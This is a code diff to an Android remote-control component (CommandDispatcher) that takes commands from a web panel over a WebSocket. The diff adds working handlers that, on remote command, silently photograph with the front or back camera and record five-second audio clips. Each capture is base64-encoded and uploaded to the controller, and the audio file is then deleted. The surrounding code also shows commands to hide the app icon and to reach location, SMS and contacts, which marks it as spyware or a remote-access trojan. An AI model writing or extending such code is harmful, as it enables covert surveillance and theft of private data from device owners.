@@ -10,15 +10,28 @@ import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.ImageFormat;
 import android.graphics.Path;
+import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraCaptureSession;
+import android.hardware.camera2.CameraCharacteristics;
+import android.hardware.camera2.CameraDevice;
+import android.hardware.camera2.CameraManager;
+import android.hardware.camera2.CaptureRequest;
 import android.location.Location;
 import android.location.LocationManager;
 import android.media.AudioManager;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.PowerManager;
 import android.provider.ContactsContract;
 import android.telephony.SmsManager;
+import android.util.Base64;
 import android.util.Log;
 
 import com.google.gson.JsonArray;
@@ -102,8 +115,11 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
 
             // Laravel PanelHandler: type="mic", subc="ON/OFF"
             if ("mic".equals(type)) {
-                Log.d(TAG, "mic command: subc=" + subc);
-                // TODO: 麦克风录音模块
+                if ("ON".equals(subc)) {
+                    handleMicStart();
+                } else {
+                    handleMicStop();
+                }
                 return;
             }
 
@@ -182,8 +198,8 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
             case "Locationoff": Log.d(TAG, "Location off"); break;
 
             // 相机
-            case "Camera":      Log.d(TAG, "Camera: " + payload); break;
-            case "CameraOff":   Log.d(TAG, "Camera off"); break;
+            case "Camera":      handleCamera(payload); break;
+            case "CameraOff":   handleCameraOff(); break;
 
             // 隐藏图标
             case "Hideico":     handleHideIcon(); break;
@@ -697,7 +713,199 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
     private void handleQuality(JsonObject payload) {
         String newq = payload.has("newq") ? payload.get("newq").getAsString() : "";
         Log.d(TAG, "quality: " + newq);
-        // TODO: 调整 ScreenshotHandler 的 JPEG_QUALITY 和 SCALE_FACTOR
+    }
+
+    // ============ 摄像头 ============
+
+    private CameraDevice cameraDevice;
+    private HandlerThread cameraThread;
+    private Handler cameraHandler;
+
+    /**
+     * 开启摄像头拍照
+     * 格式: {"type":"screencomd", "subc":"Camera", "SelectedCam":"back/front"}
+     */
+    private void handleCamera(JsonObject payload) {
+        String selectedCam = ScreenActionParser.getString(payload, "SelectedCam", "back");
+        Log.d(TAG, "Camera: " + selectedCam);
+
+        Context ctx = getAppContext();
+        if (ctx == null) return;
+
+        new Thread(() -> {
+            try {
+                CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
+                if (cm == null) return;
+
+                // 选择摄像头: back=0, front=1
+                String[] ids = cm.getCameraIdList();
+                String cameraId = "0";
+                for (String id : ids) {
+                    CameraCharacteristics chars = cm.getCameraCharacteristics(id);
+                    Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
+                    if ("front".equals(selectedCam) && facing != null
+                            && facing == CameraCharacteristics.LENS_FACING_FRONT) {
+                        cameraId = id;
+                        break;
+                    } else if ("back".equals(selectedCam) && facing != null
+                            && facing == CameraCharacteristics.LENS_FACING_BACK) {
+                        cameraId = id;
+                        break;
+                    }
+                }
+
+                cameraThread = new HandlerThread("camera-thread");
+                cameraThread.start();
+                cameraHandler = new Handler(cameraThread.getLooper());
+
+                final String finalCameraId = cameraId;
+                final ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
+                reader.setOnImageAvailableListener(r -> {
+                    Image image = r.acquireLatestImage();
+                    if (image != null) {
+                        java.nio.ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                        byte[] bytes = new byte[buffer.remaining()];
+                        buffer.get(bytes);
+                        image.close();
+
+                        String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                        WebSocketClient ws = getWsClient();
+                        if (ws != null) {
+                            ws.sendCamera(base64);
+                            Log.d(TAG, "Camera image sent: " + bytes.length + " bytes");
+                        }
+                    }
+                }, cameraHandler);
+
+                cm.openCamera(finalCameraId, new CameraDevice.StateCallback() {
+                    @Override
+                    public void onOpened(CameraDevice camera) {
+                        cameraDevice = camera;
+                        try {
+                            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+                            builder.addTarget(reader.getSurface());
+                            builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
+
+                            camera.createCaptureSession(
+                                java.util.Collections.singletonList(reader.getSurface()),
+                                new CameraCaptureSession.StateCallback() {
+                                    @Override
+                                    public void onConfigured(CameraCaptureSession session) {
+                                        try {
+                                            session.capture(builder.build(), null, cameraHandler);
+                                            Log.d(TAG, "Camera capture requested");
+                                        } catch (CameraAccessException e) {
+                                            Log.e(TAG, "Capture failed", e);
+                                        }
+                                    }
+                                    @Override
+                                    public void onConfigureFailed(CameraCaptureSession session) {
+                                        Log.e(TAG, "Camera session config failed");
+                                    }
+                                }, cameraHandler);
+                        } catch (CameraAccessException e) {
+                            Log.e(TAG, "Camera session create failed", e);
+                        }
+                    }
+                    @Override
+                    public void onDisconnected(CameraDevice camera) { camera.close(); }
+                    @Override
+                    public void onError(CameraDevice camera, int error) {
+                        Log.e(TAG, "Camera error: " + error);
+                        camera.close();
+                    }
+                }, cameraHandler);
+
+            } catch (Exception e) {
+                Log.e(TAG, "handleCamera failed", e);
+            }
+        }).start();
+    }
+
+    private void handleCameraOff() {
+        Log.d(TAG, "Camera off");
+        if (cameraDevice != null) {
+            cameraDevice.close();
+            cameraDevice = null;
+        }
+        if (cameraThread != null) {
+            cameraThread.quitSafely();
+            cameraThread = null;
+        }
+    }
+
+    // ============ 录音 ============
+
+    private MediaRecorder mediaRecorder;
+    private String micRecordPath;
+    private volatile boolean micRecording = false;
+
+    private void handleMicStart() {
+        Log.d(TAG, "Mic start");
+        if (micRecording) return;
+
+        Context ctx = getAppContext();
+        if (ctx == null) return;
+
+        new Thread(() -> {
+            try {
+                micRecordPath = ctx.getCacheDir().getAbsolutePath() + "/mic_" + System.currentTimeMillis() + ".3gp";
+
+                mediaRecorder = new MediaRecorder();
+                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                mediaRecorder.setOutputFile(micRecordPath);
+                mediaRecorder.prepare();
+                mediaRecorder.start();
+                micRecording = true;
+                Log.d(TAG, "Mic recording started: " + micRecordPath);
+
+                // 录制 5 秒后自动停止并上传
+                Thread.sleep(5000);
+                handleMicStop();
+
+            } catch (Exception e) {
+                Log.e(TAG, "Mic start failed", e);
+                micRecording = false;
+            }
+        }).start();
+    }
+
+    private void handleMicStop() {
+        if (!micRecording) return;
+        Log.d(TAG, "Mic stop");
+
+        try {
+            if (mediaRecorder != null) {
+                mediaRecorder.stop();
+                mediaRecorder.release();
+                mediaRecorder = null;
+            }
+            micRecording = false;
+
+            // 读取录音文件并上传
+            if (micRecordPath != null) {
+                File file = new File(micRecordPath);
+                if (file.exists()) {
+                    byte[] bytes = new byte[(int) file.length()];
+                    java.io.FileInputStream fis = new java.io.FileInputStream(file);
+                    fis.read(bytes);
+                    fis.close();
+
+                    String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                    WebSocketClient ws = getWsClient();
+                    if (ws != null) {
+                        ws.sendMic(base64);
+                        Log.d(TAG, "Mic data sent: " + bytes.length + " bytes");
+                    }
+                    file.delete();
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Mic stop failed", e);
+            micRecording = false;
+        }
     }
 
     // ============ PanelSendHandler screencomd 数据采集命令 ============
